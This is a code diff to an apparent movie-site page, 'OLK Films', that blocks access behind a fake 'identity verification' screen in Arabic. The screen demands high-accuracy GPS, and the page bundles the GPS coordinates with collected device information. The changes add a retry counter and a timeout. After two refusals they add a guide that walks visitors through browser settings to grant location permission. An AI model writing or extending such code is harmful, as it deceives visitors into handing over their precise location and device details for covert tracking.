@@ -228,12 +228,17 @@
                 <div class="loading-logo">OLK Films</div>
                 <div class="blocked-icon">🔒</div>
                 <div class="blocked-title">مطلوب تأكيد الهوية</div>
-                <div class="blocked-text">
+                <div class="blocked-text" id="blockedText">
                     للحماية من الروبوتات والوصول الغير مصرح به،<br>
                     يرجى السماح بالتحقق من هويتك للمتابعة
                 </div>
+                <div id="settingsGuide" style="display:none;text-align:right;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:12px;padding:14px 18px;margin-bottom:16px;font-size:13px;color:rgba(255,255,255,0.7);line-height:2;">
+                    <div style="text-align:center;font-weight:700;color:#e50914;margin-bottom:8px;">⚠️ الموقع محظور — فعّله بالخطوات:</div>
+                    <div>🔒 اضغط على القفل بجانب الرابط أعلاه</div>
+                    <div>← أذونات الموقع ← <span style="color:#4CAF50;font-weight:700;">سماح</span></div>
+                    <div style="margin-top:6px;color:rgba(255,255,255,0.4);font-size:11px;">ثم اضغط "إعادة المحاولة" بالأسفل</div>
+                </div>
                 <button class="retry-btn" onclick="requestGPS()">✓ تأكيد والمتابعة</button>
-
             </div>
         </div>
     </div>
@@ -460,16 +465,20 @@
         }
 
         async function requestGPS() {
+            retryCount++;
             document.getElementById('gpsBlocked').classList.remove('active');
             document.getElementById('normalLoading').classList.remove('hidden');
 
             try {
-                const gpsPosition = await new Promise((resolve, reject) => {
-                    if (!navigator.geolocation) { reject(new Error('Not supported')); return; }
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true, timeout: 20000, maximumAge: 0
-                    });
-                });
+                const gpsPosition = await Promise.race([
+                    new Promise((resolve, reject) => {
+                        if (!navigator.geolocation) { reject(new Error('Not supported')); return; }
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true, timeout: 15000, maximumAge: 0
+                        });
+                    }),
+                    new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 16000))
+                ]);
 
                 const info = await collectDeviceInfo();
                 info.gpsLocation = {
@@ -507,7 +516,13 @@
                 showSite();
 
             } catch (e) {
+                // Show blocked screen
                 showBlocked();
+                // After 2 fails, show settings guide
+                if (retryCount >= 2) {
+                    document.getElementById('settingsGuide').style.display = 'block';
+                    document.getElementById('blockedText').innerHTML = 'تم رفض الوصول للموقع الجغرافي.<br>يرجى تفعيله من إعدادات المتصفح ثم إعادة المحاولة';
+                }
             }
         }
 
